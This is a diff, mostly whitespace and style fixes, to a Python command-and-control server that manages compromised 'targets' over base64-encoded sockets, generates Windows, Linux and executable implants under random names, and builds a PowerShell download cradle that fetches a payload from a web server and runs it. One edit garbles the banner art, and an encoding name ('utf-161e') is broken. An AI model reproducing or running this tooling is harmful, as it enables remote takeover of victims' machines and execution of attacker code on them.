@@ -13,8 +13,9 @@ import base64
 import subprocess
 from datetime import datetime
 from prettytable import PrettyTable
-#mine
+# mine
 from colorama import Fore, Style
+
 
 def banner():
     print(Fore.GREEN + Style.BRIGHT + "")
@@ -38,6 +39,7 @@ def banner():
     print()
     print("-" * 78)
 
+
 def comm_in(targ_id):
     print('[+] Awaiting response...')
     response = targ_id.recv(4096).decode()
@@ -45,15 +47,18 @@ def comm_in(targ_id):
     response = response.decode().strip()
     return response
 
+
 def comm_out(targ_id, message):
     message = str(message)
     message = base64.b64encode(bytes(message, encoding='utf8'))
     targ_id.send(message)
 
+
 def kill_sig(targ_id, message):
-    message =str(message)
+    message = str(message)
     message = base64.b64encode(bytes(message, encoding='utf8'))
     targ_id.send(message)
+
 
 def target_comm(targ_id, targets, num):
     while True:
@@ -96,12 +101,14 @@ def target_comm(targ_id, targets, num):
                     break
                 print(response)
 
+
 def listener_handler():
     sock.bind((host_ip, int(host_port)))
     print('[+] Awaiting connection from client...')
     sock.listen()
     t1 = threading.Thread(target=comm_handler)
     t1.start()
+
 
 def comm_handler():
     while True:
@@ -138,8 +145,9 @@ def comm_handler():
         except:
             pass
 
+
 def winplant():
-    ran_name = (''.join(random.choices(string.ascii_lowercase,k=6)))
+    ran_name = (''.join(random.choices(string.ascii_lowercase, k=6)))
     file_name = f'{ran_name}.py'
     check_cwd = os.getcwd()
     if os.path.exists(f'{check_cwd}\\winplant.py'):
@@ -160,6 +168,7 @@ def winplant():
         print(f'[+] {file_name} saved to {check_cwd}')
     else:
         print('[-] Some error occured with generation. ')
+
 
 def linplant():
     ran_name = (''.join(random.choices(string.ascii_lowercase, k=6)))
@@ -183,6 +192,7 @@ def linplant():
         print(f'[+] {file_name} saved to {check_cwd}')
     else:
         print('[-] Some error occured with generation. ')
+
 
 def exeplant():
     ran_name = (''.join(random.choices(string.ascii_lowercase, k=6)))
@@ -213,6 +223,7 @@ def exeplant():
     else:
         print('[-] Some error occured during generation.')
 
+
 def pshell_cradle():
     web_server_ip = input('[+] Web server listening host: ')
     web_server_port = input('[+] Web server port: ')
@@ -225,7 +236,7 @@ def pshell_cradle():
     runner_cal_unencoded = f"iex (new-object net.webclient).downloadstring('http://{web_server_ip}:{web_server_port}/{runner_file}')".encode('utf-161e')
     with open(runner_file, 'w') as f:
         f.write(f'powershell -c wget http://{web_server_ip}:{web_server_port}/{payload_name} -outfile {randomized_exe_file}; Start-Process -FilePath {randomized_exe_file}')
-        #if the above line cutss off, it continues as ; Start-Process -FilePath {randomized_exe_file}')
+        # if the above line cutss off, it continues as ; Start-Process -FilePath {randomized_exe_file}')
         f.close()
     b64_runner_cal = base64.b64encode(runner_cal_unencoded)
     b64_runner_cal = b64_runner_cal.decode()
@@ -233,12 +244,13 @@ def pshell_cradle():
     b64_runner_cal_decoded = base64.b64decode(b64_runner_cal).decode()
     print(f'\n[+] Unencoded payload\n\n{b64_runner_cal_decoded}')
 
+
 def help():
     print('''
 
-    ___                               _    
+    ___                               _
    / __|___ _ __  _ __  __ _ _ __  __| |___
-   | (__/ _ \ '  \| '  \/ _` | '  \/ _` (_-<
+   | (__/ _ \ '  | '  *\/ _` | '  / _` (_-<
     \___\___/_|_|_|_|_|_\__,_|_|_|_\__,_/__/
     ----------------------------------------
     Menu Commands
@@ -304,7 +316,7 @@ if __name__ == '__main__':
                 if command.split(" ")[1] == '-i':
                     try:
                         num = int(command.split(" ")[2])
-                        targ_id = (targets[num]) [0]
+                        targ_id = (targets[num])[0]
                         if (targets[num])[7] == 'Active':
                             target_comm(targ_id, targets, num)
                         else:
@@ -340,7 +352,7 @@ if __name__ == '__main__':
                         continue
 
         except KeyboardInterrupt:
-            quit_message = input ('Ctrl-C\n[+] Do you really want to quit?(y/n)').lower()
+            quit_message = input('Ctrl-C\n[+] Do you really want to quit?(y/n)').lower()
             if quit_message == 'y':
                 tar_length = len(targets)
                 for target in targets:
